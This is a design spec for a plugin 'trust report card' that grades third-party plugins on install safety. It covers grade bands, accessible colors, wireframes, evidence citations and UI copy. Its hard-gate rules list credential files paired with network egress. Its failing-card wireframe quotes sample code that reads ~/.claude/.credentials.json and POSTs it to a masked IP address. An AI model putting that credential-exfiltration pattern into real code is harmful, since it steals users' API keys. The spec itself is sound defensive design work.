# Trust Report Card — Design Spec

Status: draft v1 · Owner: design · Audience: plugin installers (mostly non-technical), plugin authors, auditors

## 1. Purpose and the 5-second test

The trust report card is the single artifact that answers one question: **"Is it safe for me to install this plugin?"**

**Audience test (binding acceptance criterion):** a non-technical user, shown the card for 5 seconds with no prior context, must be able to say *"it's fine"*, *"it's iffy"*, or *"don't install"* — and be right.

That forces three rules:

1. **One verdict, top-left, biggest thing on screen.** Grade letter + one plain-English sentence. Everything else is evidence for people who ask "why?".
2. **Never rely on color alone.** Grade letter, icon shape, and word label all encode the same signal (WCAG 1.4.1).
3. **Evidence is collapsed by default.** Depth on demand. A wall of `file:line` citations at first paint fails the 5-second test even though the charter demands citations exist.

Charter tie-ins: *"Trust over speed: every claim about a third-party plugin must cite evidence (file:line)"* and *"Produces a human-readable trust report card (grade + evidence) stored in-repo, so claims are auditable."*

---

## 2. Grade bands

Grades are derived, not editorial. The score comes from the analyzer; the band is a pure function of the score and of hard gates.

| Grade | Score | Word label | Icon | Plain-English verdict | Install flow |
|-------|-------|-----------|------|----------------------|--------------|
| **A** | 90-100 | Verified | ● filled circle | "We read the code. Nothing reaches the network or your credentials." | One-click install |
| **B** | 75-89 | Low risk | ◗ half circle | "Does what it says. A few normal permissions worth a glance." | Install, with a permissions summary shown |
| **C** | 55-74 | Review needed | ◆ diamond | "Some behavior we can't fully explain. Read the findings first." | Install requires expanding findings |
| **D** | 35-54 | Risky | ▲ triangle | "This plugin can reach the network and touch sensitive files." | Explicit typed risk consent |
| **F** | 0-34 | Do not install | ■ square with slash | "We found behavior consistent with malicious code." | Blocked; override behind a flag |
| **?** | n/a | Unreviewed | ○ hollow circle | "Nobody has audited this yet." | Treated as D for consent purposes |

**Hard gates (override the score, cannot be out-scored):**

- Credential file read (`~/.claude`, `~/.codex`, `auth.json`, `.env`, keychain) + any network egress in the same module ⇒ **F**.
- Obfuscated or encoded payload that is `eval`'d / `new Function`'d at runtime ⇒ **F**.
- Install/postinstall lifecycle hook that spawns a shell ⇒ at most **D**.
- Any dynamic code execution at all ⇒ at most **C**.
- No source available for the published artifact (binary-only) ⇒ **?**, never better.

**`?` is not a grade, it is the absence of one.** Copy must never let "unreviewed" read as "fine".

### 2.1 Color semantics (colorblind-safe)

Palette chosen from the Okabe–Ito colorblind-safe set, checked against deuteranopia, protanopia, and tritanopia. We deliberately avoid a red/green pair as the primary A-vs-F contrast; the primary contrast is **blue (good) vs vermillion (bad)**, which survives all three common CVD types, plus luminance separation so it also works in grayscale.

| Grade | Light fg | Light bg | Dark fg | Dark bg | Relative luminance rank |
|-------|----------|----------|---------|---------|------------------------|
| A | `#005A9E` | `#E3F0FA` | `#7FC4F5` | `#0B2233` | brightest bg |
| B | `#0072B2` | `#E8F4FB` | `#8ECBF7` | `#0C1E2B` | — |
| C | `#8A6100` | `#FBF3E0` | `#E8B33A` | `#2B2208` | mid |
| D | `#B35A00` | `#FDEEE0` | `#F0A05A` | `#301B08` | — |
| F | `#9E2A17` | `#FDE7E3` | `#F08A72` | `#33110B` | darkest bg |
| ? | `#4A4A4A` | `#F0F0F0` | `#B0B0B0` | `#1C1C1C` | neutral |

Rules:

- All fg/bg pairs meet **WCAG AA 4.5:1** for body text and **3:1** for the large grade glyph and for badge borders.
- Every colored surface carries a **1px border at the fg color** so the badge is still bounded in forced-colors / high-contrast mode.
- **Grayscale fallback is normative**: if you desaturate the card, A-through-F must still read as a monotonic light-to-dark ramp. Any new color must preserve that ramp.
- Terminal render uses ANSI 256 nearest neighbors and falls back to bold/dim + the letter when `NO_COLOR` is set.
- Markdown render in the repo has **no color at all** — it relies on letter, icon, and word label. This is the strictest test of the design, and it is why the icons exist.

---

## 3. Anatomy

```
Verdict block   grade glyph · word label · one-sentence verdict
Provenance      verified at commit, date, analyzer version, plugin version
Findings        severity-sorted badges, one line each, expandable
Evidence        file:line citations under each finding, expandable
Actions         Install / Re-verify / View full report / Report a problem
```

Reading order (DOM order == visual order == screen-reader order): verdict → provenance → findings → evidence → actions.

---

## 4. ASCII wireframe

### 4.1 Collapsed (default state, the 5-second view)

```
┌────────────────────────────────────────────────────────────────────────┐
│                                                                        │
│   ┌─────┐   LOW RISK                                    [ Install ]    │
│   │  ◗  │   Does what it says. A few normal permissions               │
│   │  B  │   worth a glance.                                           │
│   └─────┘                                                              │
│                                                                        │
│   dsh-plugin-notion  v0.4.1  ·  MIT  ·  github.com/acme/dsh-notion     │
│                                                                        │
│   ✓ Verified at commit a1b2c3d · 2026-08-24 · analyzer v0.3.0          │
│     ↻ Re-verify                                                        │
│                                                                        │
│   ── 3 findings ─────────────────────────────────────────────────────  │
│   [ ! MEDIUM ]  Sends data to api.notion.com                     ▸     │
│   [ ~ LOW    ]  Reads files under ~/.dsh/                        ▸     │
│   [ i INFO   ]  Registers a session lifecycle hook               ▸     │
│                                                                        │
│   What we checked ▸        Full report ▸        Report a problem ▸     │
└────────────────────────────────────────────────────────────────────────┘
```

### 4.2 One finding expanded (evidence with citations)

```
│   ── 3 findings ─────────────────────────────────────────────────────  │
│   [ ! MEDIUM ]  Sends data to api.notion.com                     ▾     │
│   │                                                                    │
│   │  What this means                                                   │
│   │  The plugin makes network requests to Notion's API. That is        │
│   │  expected for a Notion plugin. It is a risk only if you did not    │
│   │  expect this plugin to talk to the internet.                       │
│   │                                                                    │
│   │  Evidence (2)                                                      │
│   │   • src/client.ts:42     fetch(`https://api.notion.com/v1/...`)    │
│   │   • src/client.ts:88     fetch(url, { headers: { Authorization }})  │
│   │                                                                    │
│   │  Data leaving your machine: page IDs, page content you select.     │
│   │  Credentials involved: your Notion token (you provide it).          │
│   │                                                             [ copy ]│
│   [ ~ LOW    ]  Reads files under ~/.dsh/                        ▸     │
```

### 4.3 Failing card (F)

```
┌────────────────────────────────────────────────────────────────────────┐
│   ┌─────┐   DO NOT INSTALL                        [ Install ] disabled │
│   │  ▨  │   We found behavior consistent with malicious code.          │
│   │  F  │                                                              │
│   └─────┘                                                              │
│   dsh-fast-search  v1.2.0  ·  no license  ·  github.com/xxx/fast-search│
│   ✓ Verified at commit 9f8e7d6 · 2026-08-24 · analyzer v0.3.0          │
│   ── 1 critical, 2 high ────────────────────────────────────────────── │
│   [ ✖ CRITICAL ] Reads ~/.claude/.credentials.json and POSTs it out ▾  │
│   │  Evidence (2)                                                      │
│   │   • dist/index.js:1    readFileSync(homedir()+'/.claude/.creden…')  │
│   │   • dist/index.js:1    fetch('http://45.13.x.x/c', {method:'POST'}) │
│   │  This is the pattern used to steal API keys.                       │
│   Install anyway requires: dsh plugin add --i-accept-the-risk           │
└────────────────────────────────────────────────────────────────────────┘
```

### 4.4 Unreviewed

```
┌────────────────────────────────────────────────────────────────────────┐
│   ┌─────┐   UNREVIEWED                            [ Review it now ]    │
│   │  ○  │   Nobody has audited this yet. Treat it like unknown code.   │
│   │  ?  │                                                              │
│   └─────┘                                                              │
│   No report on file. Running a review takes about 30 seconds and       │
│   happens entirely on your machine.                                    │
└────────────────────────────────────────────────────────────────────────┘
```

### 4.5 Narrow / mobile (< 480px)

Grade glyph moves above the verdict line; actions stack full-width; findings keep one line each with the badge on its own row.

```
┌──────────────────────────────┐
│  ┌─────┐                     │
│  │  ◗  │                     │
│  │  B  │                     │
│  └─────┘                     │
│  LOW RISK                    │
│  Does what it says. A few    │
│  normal permissions worth    │
│  a glance.                   │
│                              │
│  [      Install       ]      │
│  [     Re-verify      ]      │
│                              │
│  3 findings                  │
│  [ ! MEDIUM ]             ▸  │
│  Sends data to api.notion.com│
└──────────────────────────────┘
```

---

## 5. Findings and severity badges

Five levels. Each has a letter/symbol prefix, an uppercase word, and a color — three redundant encodings.

| Severity | Symbol | Color (light fg/bg) | Meaning | Sort |
|----------|--------|--------------------|---------|------|
| CRITICAL | ✖ | `#9E2A17` / `#FDE7E3` | Evidence of malicious intent. Do not install. | 1 |
| HIGH | ▲ | `#B35A00` / `#FDEEE0` | Powerful capability with no plausible benign reason. | 2 |
| MEDIUM | ! | `#8A6100` / `#FBF3E0` | Real capability, plausible reason, worth your attention. | 3 |
| LOW | ~ | `#0072B2` / `#E8F4FB` | Normal for this kind of plugin. Listed for completeness. | 4 |
| INFO | i | `#4A4A4A` / `#F0F0F0` | Neutral fact about the plugin. Not a risk claim. | 5 |

Badge rules:

- Fixed-width badge box so the list forms a clean column (terminal and web).
- Findings always sorted by severity, then by file path. Never by discovery order.
- A finding **must** carry ≥1 evidence citation. A finding with zero citations is a bug and fails CI (`no-uncited-finding`).
- Count line reads "3 findings" for mixed low severity, but "1 critical, 2 high" when anything CRITICAL/HIGH exists — the summary escalates itself.
- Suppressed/accepted findings render struck-through with an "accepted by you on <date>" note; they never silently vanish.

### 5.1 Finding object

```yaml
id: NET-001
severity: medium
title: Sends data to api.notion.com          # ≤ 60 chars, plain English, verb-first
explanation: >                                # 2-3 sentences, no jargon
  The plugin makes network requests to Notion's API...
evidence:
  - path: src/client.ts
    line: 42
    excerpt: "fetch(`https://api.notion.com/v1/pages/${id}`)"
  - path: src/client.ts
    line: 88
    excerpt: "fetch(url, { headers: { Authorization: token } })"
data_leaving: [page ids, selected page content]
credentials: [notion token (user-provided)]
rule: analyzer/rules/network-egress.ts
```

---

## 6. Evidence list UI

- **Collapsed by default.** Chevron `▸`/`▾`, full row is the click target, `aria-expanded` on the row.
- **Citation format:** `path/to/file.ts:42` — monospace, click opens the file at that line (repo permalink pinned to the verified commit on web; `$EDITOR` in terminal).
- **Excerpt:** one line, truncated at 72 chars with a middle ellipsis, never re-wrapped. Long minified lines show a `column 4821` hint instead of dumping the line.
- **Copy button** yields a plain-text block of the finding plus all citations, suitable for pasting into an issue.
- **>5 citations:** show 3, then "Show all 12 citations".
- Evidence is **read-only and non-executable**: excerpts are rendered as text, never as HTML, never syntax-highlighted via anything that evaluates. Escape backticks and control chars.
- Every citation links to the **verified commit**, not to `main`. If the reader follows a link and the code changed, that is the point of pinning.

---

## 7. Provenance line

```
✓ Verified at commit a1b2c3d · 2026-08-24 · analyzer v0.3.0   ↻ Re-verify
```

Rules:

- Commit is the **short SHA of the exact tree analyzed**, hyperlinked to the permalink; hovering/`title` shows the full SHA.
- Date is the verification date in the reader's locale, with an ISO date in `title`.
- Analyzer version is shown because a grade from an old analyzer is a weaker claim.
- **Staleness states:**
  - *fresh* — commit == current default-branch head. Rendered as above.
  - *stale* — upstream has moved: `⚠ Verified at a1b2c3d — 14 commits behind. Re-verify to be current.` in the C color band, regardless of grade.
  - *mismatch* — the installed artifact's hash does not match the verified tree: `✖ The code on disk does not match what we verified.` Card degrades to **?** and install/enable is blocked.
- The line is one sentence, no more. Everything longer belongs in "Full report".

---

## 8. Re-verify button

- Label: `Re-verify` (icon `↻`). Never "Rescan" or "Refresh" — the word must imply a fresh proof.
- **Always available**, even on a fresh A card. The user's ability to re-derive the verdict themselves is the trust story.
- States: `Re-verify` → `Verifying… (12s)` with a determinate bar when steps are known → result.
- Runs **locally**, no network beyond fetching the plugin source; a tooltip says so verbatim: "Runs on your machine. Only the plugin's source is fetched."
- On completion, animate the grade change with a 200ms crossfade and announce via `aria-live="polite"`: "Re-verified. Grade changed from B to C. 1 new finding."
- **If the grade drops**, do not silently swap. Show a diff strip: `B → C · +1 finding (MEDIUM: new network endpoint)` with a persistent "what changed" link.
- Rate limit: one run per plugin per 60s; the button disables with "Just verified a moment ago."
- Result is written to `docs/trust/<plugin>/<commit>.md` so the repo record and the panel never disagree.

---

## 9. Two renderers

The same `report.yml` feeds both. Neither renderer may invent or omit a finding.

### 9.1 Markdown (in-repo, `docs/trust/<plugin>/<commit>.md`)

Constraints: GitHub markdown, no color, no JS, must be diff-readable in a PR.

```markdown
# dsh-plugin-notion — Trust Report

## ◗ B — Low risk

> Does what it says. A few normal permissions worth a glance.

| | |
|---|---|
| Plugin | `dsh-plugin-notion` v0.4.1 |
| Source | https://github.com/acme/dsh-notion |
| License | MIT |
| Verified at | [`a1b2c3d`](https://github.com/acme/dsh-notion/tree/a1b2c3d) |
| Verified on | 2026-08-24 |
| Analyzer | v0.3.0 |

## Findings (3)

### `!` MEDIUM — Sends data to api.notion.com

The plugin makes network requests to Notion's API. That is expected for a
Notion plugin. It is a risk only if you did not expect this plugin to talk
to the internet.

**Evidence**

- [`src/client.ts:42`](https://github.com/acme/dsh-notion/blob/a1b2c3d/src/client.ts#L42) — `fetch(\`https://api.notion.com/v1/pages/${id}\`)`
- [`src/client.ts:88`](https://github.com/acme/dsh-notion/blob/a1b2c3d/src/client.ts#L88) — `fetch(url, { headers: { Authorization: token } })`

**Data leaving your machine:** page IDs, page content you select.
**Credentials involved:** your Notion token (you provide it).

<details><summary><code>~</code> LOW — Reads files under ~/.dsh/</summary>
...
</details>

## What we checked

Network egress · credential access · lifecycle hooks · dynamic code
execution · obfuscation signals · dependency provenance · file writes
outside the plugin directory.

## Reproduce this

    dsh bridge verify github:acme/dsh-notion --commit a1b2c3d
```

Markdown-specific rules:

- Grade glyph + letter + word label in the H2 so it survives GitHub's TOC and any plain-text quoting.
- MEDIUM and above are expanded; LOW/INFO are inside `<details>`.
- A README badge variant: `![trust: B](https://.../badge/notion.svg)` with alt text `trust grade B, low risk` — alt text carries the verdict, not just the letter.

### 9.2 Rich component (DSH web panel)

- Component: `<TrustCard report={report} variant="compact|full" />`. `compact` is the catalog row (glyph + letter + word + finding count). `full` is §4.1.
- Follows DSH `BRAND_GUIDELINES.md` tokens; grade colors registered as `--dsh-trust-a … --dsh-trust-f` so themes can override while keeping the luminance ramp.
- **Accessibility:**
  - Card is `role="region"` with `aria-label="Trust report for dsh-plugin-notion: grade B, low risk"` — the verdict is in the label, so a screen-reader user also gets it in one breath.
  - Grade glyph is decorative (`aria-hidden`); the letter and word label are real text.
  - Findings are a `<ul>` of disclosure buttons; keyboard `Enter`/`Space` toggles, `Esc` collapses focused, arrow keys move between findings.
  - Focus ring 2px, offset 2px, never color-only.
  - `prefers-reduced-motion`: crossfades become instant swaps.
- **Loading:** skeleton keeps the grade box footprint so the layout does not jump; skeleton never shows a placeholder letter (no fake "A").
- **Error:** "We couldn't load this report." + Retry. Never falls back to a friendlier grade on error.
- Print stylesheet: everything expanded, links rendered as footnote URLs.

---

## 10. Copy deck

Voice: plain, calm, second person, no hype, no scare tactics. Say what the code does, then what it means for the reader. Target grade-8 reading level. No "malicious" unless we can cite it.

**Grade verdicts (the 5-second sentence)**

| Grade | Label | Verdict |
|---|---|---|
| A | Verified | We read the code. Nothing reaches the network or your credentials. |
| B | Low risk | Does what it says. A few normal permissions worth a glance. |
| C | Review needed | Some behavior we can't fully explain. Read the findings first. |
| D | Risky | This plugin can reach the network and touch sensitive files. |
| F | Do not install | We found behavior consistent with malicious code. |
| ? | Unreviewed | Nobody has audited this yet. Treat it like unknown code. |

**Provenance**

- Fresh: `Verified at commit a1b2c3d · {date} · analyzer v{n}`
- Stale: `Verified at a1b2c3d — {n} commits behind. Re-verify to be current.`
- Mismatch: `The code on disk does not match what we verified.`
- Never verified: `No report on file.`

**Re-verify**

- Idle: `Re-verify`
- Tooltip: `Runs on your machine. Only the plugin's source is fetched.`
- Running: `Verifying…`
- Done, same: `Re-verified. Nothing changed.`
- Done, better: `Re-verified. Grade improved from C to B.`
- Done, worse: `Re-verified. Grade dropped from B to C — 1 new finding.`
- Rate limited: `Just verified a moment ago.`
- Failed: `Verification didn't finish. Nothing was installed.`

**Actions**

- `Install` · `Install anyway` (D/F) · `Review it now` (?) · `Full report` · `What we checked` · `Report a problem`
- Risk consent modal (D):
  - Title: `This plugin can access things you may not expect.`
  - Body: `It can reach the network and read files outside its own folder. Only continue if you trust {author}.`
  - Confirm: `I understand — install it` · Cancel: `Not now`
- Risk consent (F): typed confirmation. `Type INSTALL to continue.` Body: `We found {n} critical issues. We strongly recommend you don't.`

**Finding titles — house style**

- Verb-first, present tense, ≤60 chars: "Sends data to api.notion.com", "Reads your Claude credentials file", "Runs code downloaded at startup".
- Name the concrete thing (host, path, API), not the category.
- Never "potentially", never "may possibly". If we're unsure, say what we saw: "We couldn't determine what this decoded string does."

**Empty and edge states**

- No findings: `Nothing to flag. We checked network access, credentials, lifecycle hooks, and dynamic code.`
- Analyzer unsupported language: `We can't audit this plugin's language yet, so we can't grade it.`
- Binary only: `This plugin ships without source. We can't verify what's inside.`

**Microcopy we will not use:** "100% safe", "guaranteed", "trusted by thousands", "AI-verified", any emoji in the verdict line.

---

## 11. Acceptance checks

1. **5-second test**: 5 non-technical testers, 5s exposure, ≥4/5 correctly sort each of A/C/F into fine / iffy / don't.
2. **Grayscale test**: screenshot desaturated — all 6 states remain distinguishable and correctly ordered.
3. **CVD simulation**: deuteranopia, protanopia, tritanopia — no two adjacent grades collapse.
4. **Contrast**: automated axe run, zero AA violations on all six states, both themes, plus forced-colors mode.
5. **Citation integrity**: every finding has ≥1 `file:line`; every link resolves at the pinned commit (CI link-check).
6. **Parity**: markdown and web renderers produce identical finding sets and grades from the same `report.yml` (snapshot test).
7. **Screen reader**: VoiceOver reads grade, label, verdict, and finding count before any evidence.
8. **No-color terminal**: `NO_COLOR=1` output still conveys all six states.

## 12. Open questions

- Should a plugin's grade be allowed to improve without a code change (analyzer improvements)? Leaning yes, but the card should say `analyzer v0.4.0 re-graded this` rather than presenting it as new work by the author.
- Do we show community "accepted risk" counts? Risks turning a proof into a popularity contest. Deferred.
- Author right-of-reply: a signed `RESPONSE.md` rendered under findings. Deferred to v2.
